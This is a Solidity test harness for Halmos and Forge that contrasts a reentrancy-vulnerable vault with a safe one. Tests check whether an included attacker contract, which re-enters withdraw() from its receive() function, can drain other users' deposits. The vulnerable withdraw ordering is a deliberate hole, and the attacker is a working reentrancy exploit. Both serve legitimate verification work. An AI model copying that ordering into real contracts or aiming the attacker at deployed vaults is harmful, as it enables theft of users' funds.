// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// SOL-001 harness (Step 2): CEI-violating vault vs CEI-safe vault, with
/// an explicit attacker contract that re-enters on receive().
contract ReentrancyVaultVulnerable {
    mapping(address => uint256) public balances;
    receive() external payable {}
    function deposit() public payable { balances[msg.sender] += msg.value; }
    function withdraw(uint256 amount) public {
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        // Pre-0.8 semantics modelled with unchecked: the late update
        // wraps instead of reverting, so the drain persists on unwind.
        unchecked { balances[msg.sender] -= amount; }
    }
}

contract ReentrancyVaultSafe {
    mapping(address => uint256) public balances;
    receive() external payable {}
    function deposit() public payable { balances[msg.sender] += msg.value; }
    function withdraw(uint256 amount) public {
        balances[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
    }
}

contract ReentrancyAttacker {
    address public vault;
    uint256 public amount;
    constructor(address _vault, uint256 _amount) { vault = _vault; amount = _amount; }
    function attack() public payable {
        (bool d, ) = vault.call{value: amount}(abi.encodeWithSignature("deposit()"));
        require(d);
        (bool w, ) = vault.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(w);
    }
    receive() external payable {
        if (address(vault).balance >= amount) {
            (bool w, ) = vault.call(abi.encodeWithSignature("withdraw(uint256)", amount));
            w;
        }
    }
}

contract HalmosSOL001Test {
    // Wei-scale amounts: symbolic test balances are limited, and the
    // drain arithmetic is identical at any scale.
    function check_vulnerable_no_drain() public {
        ReentrancyVaultVulnerable v = new ReentrancyVaultVulnerable();
        // Victim funds: 500 wei held by the vault for other users.
        (bool fv, ) = address(v).call{value: 500}("");
        require(fv);
        ReentrancyAttacker a = new ReentrancyAttacker(address(v), 100);
        a.attack{value: 100}();
        // Invariant: attacker cannot extract more than deposited.
        assert(address(a).balance <= 100);
    }

    function check_safe_no_drain() public {
        ReentrancyVaultSafe v = new ReentrancyVaultSafe();
        (bool fv, ) = address(v).call{value: 500}("");
        require(fv);
        ReentrancyAttacker a = new ReentrancyAttacker(address(v), 100);
        a.attack{value: 100}();
        assert(address(a).balance <= 100);
    }

    // Concrete Forge wrappers (same scenarios, for debugging with traces).
    function test_vulnerable_no_drain() public { check_vulnerable_no_drain(); }
    function test_safe_no_drain() public { check_safe_no_drain(); }
}
